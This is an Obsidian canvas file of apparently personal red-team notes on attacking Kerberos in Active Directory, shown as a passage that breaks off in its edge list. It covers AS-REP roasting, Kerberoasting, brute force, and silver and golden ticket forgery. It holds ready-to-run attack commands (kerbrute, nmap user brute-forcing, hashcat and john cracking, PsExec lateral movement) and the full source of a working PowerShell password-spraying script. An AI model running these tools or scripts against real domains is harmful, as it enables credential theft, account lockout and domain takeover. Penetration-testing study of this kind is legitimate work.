{
	"nodes":[
		{"id":"8194f91baa84356a","type":"link","url":"https://www.tarlogic.com/blog/how-to-attack-kerberos/","x":-2880,"y":3646,"width":774,"height":447},
		{"id":"38cd0cf737970ebf","type":"text","text":"# Kerberos T:88","x":-2420,"y":2906,"width":373,"height":82},
		{"id":"132300644a766541","type":"file","file":"NOTES/99. TOOLS/impacket/impacket-GetNPUsers.md","x":360,"y":2482,"width":1334,"height":418},
		{"id":"ee7b3f04feb8c503","type":"text","text":"# crack hash","x":1900,"y":3341,"width":246,"height":132},
		{"id":"2ca03b0164eaa369","type":"text","text":"# $ john\n```bash\n$ john hashes.asreproast --wordlist=/usr/share/wordlists/rockyou.txt \n```","x":2260,"y":3142,"width":781,"height":197},
		{"id":"b3b868ab535b9832","type":"text","text":"# $ hashcat\n```bash\n$ hashcat --help | grep -i \"Kerberos\"\n...\n 18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol\n ...\n \n$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n```","x":2260,"y":3473,"width":1220,"height":287},
		{"id":"a7ae588e75d2a2b9","type":"text","text":"# AS-REP Roasting\nleverages the absence of Kerberos preauthentication to perform offline attacks.\n**Targeted AS-REP Roasting**: Modify UAC settings to force vulnerability and retrieve the hash.\n## Conditions for the Attack\nIn Active Directory, the `Do not require Kerberos preauthentication` option is disabled by default.\nSome applications or technologies may require this option to be enabled, making the account vulnerable.\n\n## Process:\n1. The attacker sends an **AS-REQ** to the domain controller (DC) on behalf of a user.\n2. The DC responds with an **AS-REP**, which contains an encrypted portion.\n3. If preauthentication is disabled, the attacker can perform an **offline password attack** on the encrypted part of the AS-REP.\n## Description\n- **Target**: Accounts without Kerberos pre-authentication enabled.\n- **Mechanism**:\n    - Kerberos authentication begins with the AS-REQ (Authentication Service Request). If pre-authentication is disabled, the account's encrypted Ticket Granting Ticket (TGT) is sent to the client without first verifying the user's credentials.\n    - Attackers capture this TGT encrypted with the user's NTLM hash and brute-force it offline to recover the plaintext password.\n- **Prerequisites**:\n    - Requires a valid Active Directory user account (no elevated privileges needed).\n    - The target account must have the **\"Do not require Kerberos preauthentication\"** flag set.\n- **Goal**:\n    - Extract and crack the NTLM hash of the account's password.\n- **Typical Use**:\n    - Obtain low-privileged user credentials that may lead to privilege escalation or lateral movement.","x":-942,"y":2502,"width":714,"height":949},
		{"id":"cab5470f9dc55a94","type":"text","text":"# Kerberoasting\n**The goal of Kerberoasting is to harvest TGS tickets** for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.\n## Description\n- **Target**: Service accounts in Active Directory.\n- **Mechanism**:\n    - Service accounts in AD are tied to Service Principal Names (SPNs).\n    - Attackers request a service ticket (TGS) for the SPN. The ticket is encrypted with the service account’s password hash.\n    - The attacker captures this ticket and brute-forces it offline to recover the service account's password.\n- **Prerequisites**:\n    - Requires a valid Active Directory user account (no elevated privileges needed).\n    - The target account must have an associated SPN.\n- **Goal**:\n    - Extract and crack the NTLM hash of the service account's password.\n- **Typical Use**:\n    - Compromise high-value service accounts, often with elevated privileges.","x":-942,"y":3509,"width":714,"height":671},
		{"id":"7b1bad084a60d792","type":"link","url":"https://www.tarlogic.com/blog/how-to-attack-kerberos/#ASREPRoast","x":-180,"y":2502,"width":320,"height":400},
		{"id":"1605b04cdcc5effe","type":"link","url":"https://www.tarlogic.com/blog/how-to-attack-kerberos/#Kerberoasting","x":-180,"y":3820,"width":320,"height":360},
		{"id":"a85291a744804e9b","type":"file","file":"NOTES/99. TOOLS/mimikatz/mimikatz.md","x":-86,"y":4320,"width":1426,"height":540},
		{"id":"86aa7e78af7cdc15","type":"text","text":"# $ nmap\n```bash\n# Brute Force to get Usernames\n$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"{Domain_Name}\",userdb={Big_Userlist} {IP}\n\n# Brute Force user and password\n$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"{Domain_Name}\",userdb={Big_Userlist},passdb={Passwords_List} {IP}\n\n```","x":-942,"y":-160,"width":1334,"height":320},
		{"id":"4778d401cb45aa8f","type":"file","file":"NOTES/99. TOOLS/netexec(crackmapexec)/netexec.md","x":-942,"y":280,"width":922,"height":680},
		{"id":"656cfcf98204b530","type":"text","text":"# Kerberos brute-force\n\nIn first place, due to Kerberos is an authentication protocol, it is possible to perform brute-force attacks against it. Moreover, brute-forcing Kerberos has many advantages over brute-forcing other authentication methods, like the following:\n\n- No domain account is needed to conduct the attack, just connectivity to the KDC.\n- Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).\n- Kerberos indicates, even if the password is wrong, whether the username is correct or not. This is a huge advantage in case of performing this sort of technique without knowing any username.\n- In Kerberos brute-forcing it is also possible to discover user accounts without pre-authentication required, which can be useful to perform an ASREPRoast attack.\n\nHowever, by carrying out a brute-force attack it is also possible to **block user accounts**. Thus, this technique should be used carefully.\n# kerbrute (used on an internal Windows domain with access to one of the Domain Controllers)\nThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.\nIt is designed to be used on an internal Windows domain with access to one of the Domain Controllers.\nWarning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts\n## Go Version\n[kerbrute - GO](https://github.com/ropnop/kerbrute)\n```bash\n./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt\n```\n## python version\n[kerbrute - python](https://github.com/TarlogicSecurity/kerbrute)\n```bash\n$ pipx install kerbrute # install from python repository\n$ pipx ensurepath\n\n$ pipx list\n$ pipx run kerbrute -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt\n```\n# Spray-Passwords.ps1 (used on an internal Windows domain with access to one of the Domain Controllers)\n\n```powershell\nPS> Get-Help .\\Spray-Passwords.ps1\nPS> .\\Spray-Passwords.ps1 -Pass Nexus123! -Admin\n```\n\n","x":-942,"y":1200,"width":1334,"height":990},
		{"id":"cb59bafdc78746ef","type":"text","text":"# Spray-Passwords.ps1\n```powershell\n<#\n  .SYNOPSIS\n    PoC PowerShell script to demo how to perform password spraying attacks against \n     user accounts in Active Directory (AD), aka low and slow online brute force method.\n    Only use for good and after written approval from AD owner.\n    Requires access to a Windows host on the internal network, which may perform\n     queries against the Primary Domain Controller (PDC).\n    Does not require admin access, neither in AD or on Windows host.\n    Remote Server Administration Tools (RSAT) are not required.\n    \n    Should NOT be considered OPSEC safe since:\n    - a lot of traffic is generated between the host and the Domain Controller(s).\n    - failed logon events will be massive on Domain Controller(s).\n    - badpwdcount will iterate on user account objects in scope.\n    \n    No accounts should be locked out by this script alone, but there are no guarantees.\n    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.\n  .DESCRIPTION\n    Perform password spraying attack against user accounts in Active Directory.\n  .PARAMETER Pass\n    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url.\"\n\t\n  .PARAMETER File\n    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.\n\t\n  .PARAMETER Url\n    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.\n\t\n  .PARAMETER Admins\n    Warning: will also target privileged user accounts (admincount=1.)\". Default = $false.\n  .EXAMPLE\n    PS C:\\> .\\Spray-Passwords.ps1 -Pass 'Summer2016'\n    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).\n  .EXAMPLE\n    PS C:\\> .\\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins\n    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).\n  .EXAMPLE\n    PS C:\\> .\\Spray-Passwords.ps1 -File .\\passwords.txt -Verbose \n    \n    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).\n    2. Output script progress/status information to console.\n  .EXAMPLE\n    PS C:\\> .\\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose \n    \n    1. Download the password file with weak passwords.\n    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).\n    3. Output script progress/status information to console.\n  .LINK\n    Get latest version here: https://github.com/ZilentJack/Spray-Passwords\n  .NOTES\n    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com\n    Together with  : CyberKeel / www.cyberkeel.com\n    Date created   : 09/05-2016\n    Last modified  : 26/06-2016\n    Version history:\n    - 1.00: Initial public release, 26/06-2016\n    Tested on:\n     - WS 2016 TP5\n     - WS 2012 R2\n     - Windows 10\n    Known Issues & possible solutions/workarounds:\n     KI-0001: -\n       Solution: -\n    Change Requests for vNext (not prioritized):\n     CR-0001: Support for Fine-Grained Password Policies (FGPP).\n     CR-0002: Find better way of getting Default Domain Password Policy than \"NET ACCOUNTS\". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.\n     CR-0003: Threated approach to test more user/password combinations simultaneously.\n     CR-0004: Exception or include list based on username, group membership, SID's or the like.\n     CR-0005: Exclude user account that executes the script (password probably already known).\n    Verbose output:\n     Use -Verbose to output script progress/status information to console.\n#>\n\n[CmdletBinding(DefaultParameterSetName='ByPass')]\nParam \n(\n    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage=\"Download file from given URL and use as password input file to test multiple passwords for each targeted user account.\")]\n    [String]\n    $Url = '',\n\n    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage=\"Supply a path to a password input file to test multiple passwords for each targeted user account.\")]\n    [String]\n    $File = '',\n\n    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage=\"Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'\")]\n    [AllowEmptyString()]\n    [String]\n    $Pass = '',\n\n    [Parameter(Mandatory = $false,HelpMessage=\"Warning: will also target privileged user accounts (admincount=1.)\")]\n    [Switch]\n    $Admins = $false\n\n)\n\n# Method to determine if input is numeric or not\nFunction isNumeric ($x) {\n    $x2 = 0\n    $isNum = [System.Int32]::TryParse($x, [ref]$x2)\n    Return $isNum\n}\n\n# Method to get the lockout threshold - does not take FGPP into acocunt\nFunction Get-threshold\n{\n    $data = net accounts\n    $threshold = $data[5].Split(\":\")[1].Trim()\n\n    If (isNumeric($threshold) )\n        {\n            Write-Verbose \"threshold is a number = $threshold\"\n            $threshold = [Int]$threshold\n        }\n    Else\n        {\n            Write-Verbose \"Threshold is probably 'Never', setting max to 1000...\"\n            $threshold = [Int]1000\n        }\n    \n    Return $threshold\n}\n\n# Method to get the lockout observation window - does not tage FGPP into account\nFunction Get-Duration\n{\n    $data = net accounts\n    $duration = [Int]$data[7].Split(\":\")[1].Trim()\n    Write-Verbose \"Lockout duration is = $duration\"\n    Return $duration\n}\n\n# Method to retrieve the user objects from the PDC\nFunction Get-UserObjects\n{\n    # Get domain info for current domain\n    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}\n    Catch {Write-Verbose \"No domain found, will quit...\" ; Exit}\n   \n    # Get the DC with the PDC emulator role\n    $PDC = ($domainObj.PdcRoleOwner).Name\n\n    # Build the search string from which the users should be found\n    $SearchString = \"LDAP://\"\n    $SearchString += $PDC + \"/\"\n    $DistinguishedName = \"DC=$($domainObj.Name.Replace('.', ',DC='))\"\n    $SearchString += $DistinguishedName\n\n    # Create a DirectorySearcher to poll the DC\n    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)\n    $objDomain = New-Object System.DirectoryServices.DirectoryEntry\n    $Searcher.SearchRoot = $objDomain\n\n    # Select properties to load, to speed things up a bit\n    $Searcher.PropertiesToLoad.Add(\"samaccountname\") > $Null\n    $Searcher.PropertiesToLoad.Add(\"badpwdcount\") > $Null\n    $Searcher.PropertiesToLoad.Add(\"badpasswordtime\") > $Null\n\n    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true\n    If ($Admins) {$Searcher.filter=\"(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\"}\n    Else {$Searcher.filter=\"(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\"}\n    $Searcher.PageSize = 1000\n\n    # Find & return targeted user accounts\n    $userObjs = $Searcher.FindAll()\n    Return $userObjs\n}\n\n# Method to perform auth test with specific username and password\nFunction Perform-Authenticate\n{\n    Param\n    ([String]$username,[String]$password)\n\n    # Get current domain with ADSI\n    $CurrentDomain = \"LDAP://\"+([ADSI]\"\").DistinguishedName\n\n    # Try to authenticate\n    Write-Verbose \"Trying to authenticate as user '$username' with password '$password'\"\n    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)\n    $res = $dom.Name\n    \n    # Return true/false\n    If ($res -eq $null) {Return $false}\n    Else {Return $true}\n}\n\n# Validate and parse user supplied url to CSV file of passwords\nFunction Parse-Url\n{\n    Param ([String]$url)\n\n    # Download password file from URL\n    $data = (New-Object System.Net.WebClient).DownloadString($url)\n    $data = $data.Split([environment]::NewLine)\n\n    # Parse passwords file and return results\n    If ($data -eq $null -or $data -eq \"\") {Return $null}\n    $passwords = $data.Split(\",\").Trim()\n    Return $passwords\n}\n\n# Validate and parse user supplied CSV file of passwords\nFunction Parse-File\n{\n   Param ([String]$file)\n\n   If (Test-Path $file)\n   {\n        $data = Get-Content $file\n        \n        If ($data -eq $null -or $data -eq \"\") {Return $null}\n        $passwords = $data.Split(\",\").Trim()\n        Return $passwords\n   }\n   Else {Return $null}\n}\n\n# Main function to perform the actual brute force attack\nFunction BruteForce\n{\n   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)\n\n   #Setup variables\n   $userObj = Get-UserObjects\n   Write-Verbose \"Found $(($userObj).count) active & unlocked users...\"\n   \n   If ($passwords.Length -gt $threshold)\n   {\n        $time = ($passwords.Length - $threshold) * $duration\n        Write-Host \"Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes.\"\n   }\n\n   [Boolean[]]$done = @()\n   [Boolean[]]$usersCracked = @()\n   [Int[]]$numTry = @()\n   $results = @()\n\n   #Initialize arrays\n   For ($i = 0; $i -lt $userObj.Length; $i += 1)\n   {\n        $done += $false\n        $usersCracked += $false\n        $numTry += 0\n   }\n\n   # Main while loop which does the actual brute force.\n   Write-Host \"Performing brute force - press [q] to stop the process and print results...\" -BackgroundColor Yellow -ForegroundColor Black\n   :Main While ($true)\n   {\n        # Get user accounts\n        $userObj = Get-UserObjects\n        \n        # Iterate over every user in AD\n        For ($i = 0; $i -lt $userObj.Length; $i += 1)\n        {\n\n            # Allow for manual stop of the while loop, while retaining the gathered results\n            If ($Host.UI.RawUI.KeyAvailable -and (\"q\" -eq $Host.UI.RawUI.ReadKey(\"IncludeKeyUp,NoEcho\").Character))\n            {\n                Write-Host \"Stopping bruteforce now....\" -Background DarkRed\n                Break Main\n            }\n\n            If ($usersCracked[$i] -eq $false)\n            {\n                If ($done[$i] -eq $false)\n                {\n                    # Put object values into variables\n                    $samaccountnname = $userObj[$i].Properties.samaccountname\n                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]\n                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]\n                    \n                    # Not yet reached lockout tries\n                    If ($badpwdcount -lt ($threshold - 1))\n                    {\n                        # Try the auth with current password\n                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]\n\n                        If ($auth -eq $true)\n                        {\n                            Write-Host \"Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'\" -BackgroundColor DarkGreen\n                            $results += $samaccountnname\n                            $results += $passwords[$numTry[$i]]\n                            $usersCracked[$i] = $true\n                            $done[$i] = $true\n                        }\n\n                        # Auth try did not work, go to next password in list\n                        Else\n                        {\n                            $numTry[$i] += 1\n                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}\n                        }\n                    }\n\n                    # One more tries would result in lockout, unless timer has expired, let's see...\n                    Else \n                    {\n                        $now = Get-Date\n                        \n                        If ($badpwdtime)\n                        {\n                            $then = [DateTime]::FromFileTime($badpwdtime)\n                            $timediff = ($now - $then).TotalMinutes\n                        \n                            If ($timediff -gt $duration)\n                            {\n                                # Since observation window time has passed, another auth try may be performed\n                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]\n                            \n                                If ($auth -eq $true)\n                                {\n                                    Write-Host \"Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'\" -BackgroundColor DarkGreen\n                                    $results += $samaccountnname\n                                    $results += $passwords[$numTry[$i]]\n                                    $usersCracked[$i] = $true\n                                    $done[$i] = $true\n                                }\n                                Else \n                                {\n                                    $numTry[$i] += 1\n                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}\n                                }\n\n                            } # Time-diff if\n\n                        }\n                        Else\n                        {\n                            # Verbose-log if $badpwdtime in null. Possible \"Cannot index into a null array\" error.\n                            Write-Verbose \"- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'\"\n\t\n\t\n\t\n\t\t\t\t   # Try the auth with current password\n        \t                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]\n\t\t\t\n                                If ($auth -eq $true)\n                                {\n                                    Write-Host \"Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'\" -BackgroundColor DarkGreen\n                                    $results += $samaccountnname\n                                    $results += $passwords[$numTry[$i]]\n                                    $usersCracked[$i] = $true\n                                    $done[$i] = $true\n                                }\n                                Else \n                                {\n                                    $numTry[$i] += 1\n                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}\n                                }\n\t\t\t \n\t\t\t \n\t\t\t    \n                        } # Badpwdtime-check if\n\n                    } # Badwpdcount-check if\n\n                } # Done-check if\n\n            } # User-cracked if\n\n        } # User loop\n\n        # Check if the bruteforce is done so the while loop can be terminated\n        $amount = 0\n        For ($j = 0; $j -lt $done.Length; $j += 1)\n        {\n            If ($done[$j] -eq $true) {$amount += 1}\n        }\n\n        If ($amount -eq $done.Length) {Break}\n\n   # Take a nap for a second\n   Start-Sleep -m 1000\n\n   } # Main While loop\n\n   If ($results.Length -gt 0)\n   {\n       Write-Host \"Users guessed are:\"\n       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host \" '$($results[$i])' with password: '$($results[$i + 1])'\"}\n   }\n   Else {Write-Host \"No passwords were guessed.\"}\n}\n\n$passwords = $null\n\nIf ($Url -ne '')\n{\n    $passwords = Parse-Url $Url\n}\nElseIf($File -ne '')\n{\n    $passwords = Parse-File $File\n}\nElse\n{\n    $passwords = $Pass.Split(\",\").Trim()   \n}\n\nIf($passwords -eq $null)\n{\n    Write-Host \"Error in password input, please try again.\"\n    Exit\n}\n\n# Get password policy info\n$duration = Get-Duration\n$threshold = Get-threshold\n\nIf ($Admins) {Write-Host \"WARNING: also targeting admin accounts.\" -BackgroundColor DarkRed}\n\n# Call the main function and start the brute force\nBruteForce $duration $threshold $passwords\n```","x":440,"y":1960,"width":700,"height":230},
		{"id":"eb4e5dea930990e1","type":"text","text":"# carve tickets from host","x":-942,"y":4780,"width":616,"height":88},
		{"id":"330c7a881653c49f","type":"file","file":"NOTES/99. TOOLS/Rubeus/Rubeus.md","x":-86,"y":4939,"width":1426,"height":400},
		{"id":"aa92b75b1056cde6","type":"text","text":"hasło użytkownika za którego chcemy się podać","x":-1240,"y":2655,"width":250,"height":94},
		{"id":"ae0d7a2de86c4584","type":"text","text":"hasło konta serwisowego w kontekście którego działa usługa","x":-1240,"y":3509,"width":250,"height":94},
		{"id":"bd518a028507d970","type":"text","text":"stworzy TGS, który DLA USŁUGI uwierzytelni mnie jako ADMINISTRATORA TEJ USŁUGI","x":-1332,"y":5780,"width":390,"height":121},
		{"id":"20f34b481946c829","type":"link","url":"https://www.youtube.com/watch?v=xH5T9-m9QXw","x":-3133,"y":3196,"width":640,"height":360},
		{"id":"3c6e3f6ce754c29a","type":"text","text":"# Forge Silver  Ticket\n**Silver Ticket** forged TGS (Ticket Granting Service) for specified service (SPN)in domain.\n\n**Privileged Account Certificate (PAC) validation** is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. (Service sends ticket to DC for validation of PAC - part of service ticket with information of who we are, SID, groups) Fortunately for this attack technique, service applications rarely perform PAC validation.\n\n### **Silver Ticket**\n\n- **Target**: Specific services within the Kerberos ecosystem.\n- **Mechanism**:\n    - The attacker forges a Ticket Granting Service (TGS) for a specific SPN using the NTLM hash of the associated service account.\n    - Unlike the golden-ticket, the silver ticket is used to gain access to a specific service, not the entire domain.\n- **Prerequisites**:\n    - The NTLM hash (or password) of the service account tied to the target SPN must already be compromised.\n- **Goal**:\n    - Forge tickets for unauthorized access to specific services, bypassing Kerberos constraints.\n- **Typical Use**:\n    - Perform lateral movement or escalate privileges by abusing services like MSSQL, CIFS, or HTTP tied to the target SPN.\n\n## In general, we need to collect the following three pieces of information to create a silver ticket:\n- SPN password hash ([[mimikatz#Extracting NTLM hashes from LSASS memory]])\n- Domain SID (`whoami /user` domain SID (without last part after `-`))\n- Target SPN (Eg. _HTTP/web04.corp.com:80_)\n\nSince silver and golden-tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.","x":-942,"y":5720,"width":714,"height":1120},
		{"id":"0f761f6f0b2e4357","type":"file","file":"NOTES/99. TOOLS/impacket/impacket-GetUserSPNs.md","x":360,"y":3845,"width":1334,"height":440},
		{"id":"9ba5aca36e22087e","type":"file","file":"NOTES/99. TOOLS/Rubeus/Rubeus.md","x":360,"y":3000,"width":1334,"height":845},
		{"id":"449bcf44dd32c85f","type":"text","text":"if it is running as a Service (is on list in `services.msi`) then it will not do PAC validation. IIS do not qualify - each webpage run as different user, they run not as service but as batch job - Silver ticket will not work","x":-1538,"y":5901,"width":596,"height":103},
		{"id":"56cb8af6c88cc3e5","type":"text","text":"`services.msc` - Services on Windows","x":-1270,"y":6004,"width":328,"height":51},
		{"id":"c73b9d149533facd","type":"text","text":"użytkownik, w kontekście którego działa usługa, musi mieć nadane SPN\nna DC > `Active Directory Users nd Computers` > chose user > `Properties` > `Attribute Editor` > `servicePrincipalName` > set SPN according to documentation ","x":-1529,"y":6055,"width":587,"height":127},
		{"id":"dfcb9fe8241eaa2f","type":"file","file":"NOTES/98. Theory/Kerberos.md","x":-5600,"y":1473,"width":1960,"height":4000},
		{"id":"f1e22668a485db29","type":"text","text":"# Forge golden-ticket\nStarting July 2022, Microsoft improved the [authentication process](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041), so we'll need to provide an existing account. Let's set the golden-ticket's username to **jen**. Before it didn't matter if the account existed.\n","x":-942,"y":7200,"width":714,"height":280},
		{"id":"8e079c34782d8f37","type":"file","file":"NOTES/99. TOOLS/impacket/impacket-ticketer.md","x":314,"y":6840,"width":1866,"height":740},
		{"id":"4e32c71d15e8e8e8","type":"link","url":"https://www.tarlogic.com/blog/how-to-attack-kerberos/#Silver_ticket","x":-86,"y":5720,"width":400,"height":500},
		{"id":"0ed9a929d426927d","type":"link","url":"https://www.youtube.com/watch?v=_nJ-b1UFDVM","x":360,"y":5720,"width":640,"height":360},
		{"id":"cf11996c5b4ea35b","type":"text","text":"[[mimikatz#Forge Silver Ticket]]\n![[mimikatz#Forge Silver Ticket]]\n```powershell\nPS> iwr -UseDefaultCredentials http://web04 # use forged ticket for its service\n```","x":314,"y":6220,"width":1866,"height":440},
		{"id":"0ec87f7475e36cea","type":"text","text":"# use injected ticket in windows machine \n```powershell\nPS> .\\PsExec.exe -accepteula \\\\lab-wdc02.jurassic.park cmd\n```","x":2340,"y":6976,"width":726,"height":504},
		{"id":"7813b4326cf3d794","type":"text","text":"[[mimikatz#Forge golden-ticket on windows]]\n![[mimikatz#Forge golden-ticket on windows]]","x":314,"y":7820,"width":1866,"height":780},
		{"id":"5bff20ee30bb9ead","type":"link","url":"https://www.youtube.com/watch?v=o98_eRt777Y","x":-726,"y":7580,"width":640,"height":360},
		{"id":"282d9a9f56dae260","type":"text","text":"to get SID and `krbtgt` ntlm hash `lsadump::lsa /patch`","x":-1372,"y":6500,"width":471,"height":50},
		{"id":"b21d8082f02d74a1","type":"text","text":"1. **Sends a Kerberos AS-REQ with a dummy (incorrect) password** for each username in the list.\n    \n2. **Analyzing the Response**\n    \n    - If the username is **valid**, the KDC responds with **pre-authentication required** (`KRB5KDC_ERR_PREAUTH_REQUIRED`).\n    - If the username is **invalid**, the KDC responds with **principal unknown** (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`).\n3. **Results**\nIdentifies valid usernames based on the **different responses** received.","x":850,"y":500,"width":790,"height":320},
		{"id":"1b9c0023854257a7","type":"file","file":"NOTES/0. Redteam/2. Services/images/kerberos authentication.png","x":-3199,"y":2093,"width":363,"height":400}
	],
	"edges":[
		{"id":"1a2932d869fbf256","fromNode":"38cd0cf737970ebf","fromSide":"bottom","toNode":"8194f91baa84356a","toSide":"top"},
		{"id":"cd2b09fff71310a9","fromNode":"656cfcf98204b530","fromSide":"right","toNode":"cb59bafdc78746ef","toSide":"top"},
		{"id":"3ba133ca544bace1","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"86aa7e78af7cdc15","toSide":"left"},
		{"id":"847e20e293b61ff0","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"a7ae588e75d2a2b9","toSide":"left"},
		{"id":"c69925a7211a1f08","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"4778d401cb45aa8f","toSide":"left"},
		{"id":"54d069971b1222b7","fromNode":"132300644a766541","fromSide":"right","toNode":"ee7b3f04feb8c503","toSide":"left"},
		{"id":"d1f2b3032f28328d","fromNode":"a7ae588e75d2a2b9","fromSide":"right","toNode":"132300644a766541","toSide":"left"},
		{"id":"499bdcb8eb036acf","fromNode":"ee7b3f04feb8c503","fromSide":"right","toNode":"2ca03b0164eaa369","toSide":"left"},
		{"id":"b1e82be1fd7c59be","fromNode":"ee7b3f04feb8c503","fromSide":"right","toNode":"b3b868ab535b9832","toSide":"left"},
		{"id":"86bba0ebada21bdb","fromNode":"cab5470f9dc55a94","fromSide":"right","toNode":"0f761f6f0b2e4357","toSide":"left"},
		{"id":"9a80a7a903f84cf9","fromNode":"0f761f6f0b2e4357","fromSide":"right","toNode":"ee7b3f04feb8c503","toSide":"left"},
		{"id":"5d84d882887b0621","fromNode":"eb4e5dea930990e1","fromSide":"right","toNode":"a85291a744804e9b","toSide":"left"},
		{"id":"160054b8e58579bc","fromNode":"a7ae588e75d2a2b9","fromSide":"right","toNode":"9ba5aca36e22087e","toSide":"left"},
		{"id":"de4eb0dc123900c7","fromNode":"cab5470f9dc55a94","fromSide":"right","toNode":"9ba5aca36e22087e","toSide":"left"},
		{"id":"96d1d5060477e72a","fromNode":"9ba5aca36e22087e","fromSide":"right","toNode":"ee7b3f04feb8c503","toSide":"left"},
		{"id":"5b6081b246862df9","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"cab5470f9dc55a94","toSide":"left"},
		{"id":"a5e079e0268a86fd","fromNode":"a7ae588e75d2a2b9","fromSide":"right","toNode":"7b1bad084a60d792","toSide":"left"},
		{"id":"d3968a63403cba2d","fromNode":"cab5470f9dc55a94","fromSide":"right","toNode":"1605b04cdcc5effe","toSide":"left"},
		{"id":"f35c39266259725f","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"eb4e5dea930990e1","toSide":"left"},
		{"id":"91b3cc2feee18e2c","fromNode":"3c6e3f6ce754c29a","fromSide":"right","toNode":"4e32c71d15e8e8e8","toSide":"left"},
		{"id":"b8ba2cbfe4d91db3","fromNode":"3c6e3f6ce754c29a","fromSide":"right","toNode":"cf11996c5b4ea35b","toSide":"left"},
		{"id":"6eb6487b8c546ae9","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"3c6e3f6ce754c29a","toSide":"left"},
		{"id":"874787386e276e91","fromNode":"3c6e3f6ce754c29a","fromSide":"right","toNode":"8e079c34782d8f37","toSide":"left"},
		{"id":"1cfe74a4a1a51ed5","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"656cfcf98204b530","toSide":"left"},
		{"id":"983fd75f0ecfac60","fromNode":"eb4e5dea930990e1","fromSide":"right","toNode":"330c7a881653c49f","toSide":"left"},
		{"id":"69b1f41b2cf7fbf7","fromNode":"38cd0cf737970ebf","fromSide":"right","toNode":"f1e22668a485db29","toSide":"left"},
		{"id":"683cc245961cd973","fromNode":"f1e22668a485db29","fromSide":"right","toNode":"7813b4326cf3d794","toSide":"left"},
		{"id":"d6d35cdc77db46f1","fromNode":"f1e22668a485db29","fromSide":"right","toNode":"8e079c34782d8f37","toSide":"left"},
		{"id":"b40a3a45e1ae6f6c","fromNode":"cf11996c5b4ea35b","fromSide":"right","toNode":"0ec87f7475e36cea","toSide":"left"},
		{"id":"3a6c3939c5aa04ad","fromNode":"7813b4326cf3d794","fromSide":"right","toNode":"0ec87f7475e36cea","toSide":"left"},
		{"id":"5ab8ae8ab77020e1","fromNode":"86aa7e78af7cdc15","fromSide":"right","toNode":"b21d8082f02d74a1","toSide":"left"},
